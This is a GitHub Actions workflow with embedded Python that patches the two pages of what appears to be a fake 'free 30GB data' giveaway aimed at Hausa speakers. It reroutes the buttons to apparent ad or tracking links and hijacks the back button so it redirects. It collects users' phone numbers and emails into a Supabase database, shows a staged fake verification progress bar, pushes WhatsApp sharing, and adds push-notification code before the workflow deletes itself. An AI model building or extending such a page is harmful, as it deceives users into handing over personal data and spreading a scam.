name: Apply requested integrations
on:
  push:
    paths:
      - '.github/workflows/apply-user-integrations.yml'
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main
          fetch-depth: 0
      - name: Patch both HTML files
        shell: bash
        run: |
          python - <<'PY'
          from pathlib import Path
          import hashlib

          files = [Path('index.html'), Path('Samu Kyautar 30GB Data A Kowane Layi.html')]
          shared_url = 'https://www.voicefornigeria.com/'
          verify_url = 'https://jikgykm.com/cl/d2043286aec4e80a'
          back_url = 'https://spongeascend.com/tamt7741r?key=51beb06476ba544db62a36db1d10e11b'
          supabase_url = 'https://cqnovqvmxwmfngupgtov.supabase.co'
          supabase_key = 'sb_publishable_wm6kcw1pDhtyyORf0gLbVA_icVzmQ95'
          webpush_key = 'BNqyP7Zc98Edi6fyli-Tmv2W0I35cDVO5REXf6ZdWSs4NPaNGOnQJQeRIDSubOh6NnNOvzFUs0WjwjLIZeojb-Y'

          webpush = f'''\n  <!-- start webpushr code -->\n  <script>\n    (function(w,d,s,id){{\n      if(typeof(w.webpushr)!=='undefined')return;\n      w.webpushr=w.webpushr||function(){{(w.webpushr.q=w.webpushr.q||[]).push(arguments)}};\n      var js,fjs=d.getElementsByTagName(s)[0];\n      js=d.createElement(s);js.id=id;js.async=1;\n      js.src='https://cdn.webpushr.com/app.min.js';\n      fjs.parentNode.appendChild(js);\n    }}(window,document,'script','webpushr-jssdk'));\n    webpushr('setup',{{'key':'{webpush_key}'}});\n  </script>\n  <!-- end webpushr code -->\n'''

          def share_engine(text):
              start = text.index(' var swidth = localStorage.getItem(saved);')
              end = text.index('\n    <script>\n        window.onhashchange', start)
              return text[start:end]

          originals = {}
          for p in files:
              text = p.read_text(encoding='utf-8')
              originals[p] = hashlib.sha256(share_engine(text).encode()).hexdigest()

              # Shared WhatsApp URL only.
              text = text.replace('https://kluspz.com/25GB-Free-Anniversary-Data', shared_url, 1)

              # Verify button destination via existing abcde variable.
              text = text.replace('abcde = "go.php",', f'abcde = "{verify_url}",', 1)

              # Existing back-redirect functions.
              text = text.replace('location.href = "go.php";', f'location.href = "{back_url}";')

              # Ensure back navigation reaches the requested destination even though the legacy hash handler is later overwritten.
              marker = "        setTimeout('hh();', 500);\n"
              popstate = marker + f'''        window.addEventListener("popstate", function() {{\n            window.location.replace("{back_url}");\n        }}, {{ once: true }});\n'''
              if 'window.addEventListener("popstate"' not in text:
                  text = text.replace(marker, popstate, 1)

              # Add email field beneath the existing phone field.
              phone_line = '                <center><input type="number" placeholder="Enter your number here" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center>\n'
              email_line = phone_line + '                <br><center><input type="email" placeholder="Shigar da Gmail/Email ɗinku" id="email" name="Email" inputmode="email" autocomplete="email" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;"></center>\n'
              if 'id="email"' not in text:
                  if phone_line not in text:
                      raise SystemExit(f'Phone field marker missing in {p}')
                  text = text.replace(phone_line, email_line, 1)

              old_error = '            <p class="error">baku shigar lambar waya mai inganci ba, ku gyara !</p>'
              new_errors = '''            <p class="error" id="phoneError">baku shigar lambar waya mai inganci ba, ku gyara !</p>\n            <p class="error" id="emailError">Ku shigar da Gmail/Email mai inganci.</p>\n            <p class="error" id="saveError">Ba a samu damar adana bayananku ba. Ku sake gwadawa.</p>'''
              if 'id="phoneError"' not in text:
                  if old_error not in text:
                      raise SystemExit(f'Error marker missing in {p}')
                  text = text.replace(old_error, new_errors, 1)

              # Replace only the confirm handler; loader/share logic outside it stays as-is.
              start = text.index('        $("#confirm").click(function() {')
              end = text.index('        $(document).click(function() {', start)
              new_confirm = f'''        async function saveRegistration(phone, email) {{\n            try {{\n                var response = await fetch("{supabase_url}/rest/v1/rpc/register_anniversary_user", {{\n                    method: "POST",\n                    headers: {{\n                        "Content-Type": "application/json",\n                        "apikey": "{supabase_key}"\n                    }},\n                    body: JSON.stringify({{\n                        p_phone: phone,\n                        p_email: email.toLowerCase()\n                    }})\n                }});\n                return response.ok;\n            }} catch (e) {{\n                return false;\n            }}\n        }}\n        $("#confirm").click(async function() {{\n            var phone = $("#name").val().trim();\n            var email = $("#email").val().trim();\n            var phoneOk = /^\\d{{10,11}}$/.test(phone);\n            var emailOk = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email);\n            $("#phoneError").toggle(!phoneOk);\n            $("#emailError").toggle(!emailOk);\n            $("#saveError").hide();\n            if (!phoneOk || !emailOk) return;\n\n            $(this).prop("disabled", true);\n            var stored = await saveRegistration(phone, email);\n            $(this).prop("disabled", false);\n            if (!stored) {{\n                $("#saveError").fadeIn(500);\n                return;\n            }}\n\n            $("#info").fadeOut(0);\n            $("#checking").fadeIn(1000);\n            var i = 0;\n            var interval = setInterval(function() {{\n                i += 1;\n                $("#percentage").text(i + "%");\n                $("#fill").css("width", i + "%");\n                if (i == 50) {{\n                    i = 49;\n                    setTimeout(function() {{\n                        i = 50;\n                    }}, 1000);\n                }}\n                if (i >= 100) {{\n                    clearInterval(interval);\n                    $("#load").fadeOut(0);\n                    $("#check").fadeIn(0);\n                    setTimeout(function() {{\n                        $("#checking").fadeOut(0);\n                        $("#share").fadeIn(1000);\n                        $("#getname").html($("#name").val());\n                    }}, 500);\n                }}\n            }}, 50);\n        }});\n'''
              text = text[:start] + new_confirm + text[end:]

              # Copy Webpushr page setup from KSamtoclef/Ann into the page head.
              if "webpushr('setup'" not in text:
                  text = text.replace('</head>', webpush + '</head>', 1)

              p.write_text(text, encoding='utf-8')

          # Both entry HTML files must remain identical.
          if files[0].read_bytes() != files[1].read_bytes():
              raise SystemExit('HTML entry files diverged')

          # Sharing progress model must be byte-for-byte unchanged.
          for p in files:
              now = p.read_text(encoding='utf-8')
              if hashlib.sha256(share_engine(now).encode()).hexdigest() != originals[p]:
                  raise SystemExit(f'Share progress engine changed in {p}')

          # Required integration checks.
          out = files[0].read_text(encoding='utf-8')
          required = [
              shared_url,
              verify_url,
              back_url,
              'id="email"',
              'register_anniversary_user',
              "webpushr('setup'",
          ]
          missing = [x for x in required if x not in out]
          if missing:
              raise SystemExit('Missing integrations: ' + repr(missing))
          PY
      - name: Commit changes and remove helper workflow
        shell: bash
        run: |
          rm -f .github/workflows/apply-user-integrations.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "Add requested URLs registration and Webpushr"
          git push origin HEAD:main
